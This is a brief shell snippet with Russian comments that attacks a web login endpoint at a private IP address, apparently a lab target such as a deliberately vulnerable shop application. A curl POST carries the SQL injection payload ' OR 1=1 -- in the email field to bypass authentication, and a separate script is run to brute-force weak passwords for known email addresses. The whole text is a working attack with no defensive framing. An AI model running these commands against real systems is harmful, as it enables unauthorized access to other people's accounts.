# обход аутентификации через SQLi
curl -X POST "http://172.20.0.106:3000/rest/user/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"

# перебор слабых паролей для известных email
python3 ./auth_weak_passwords.py
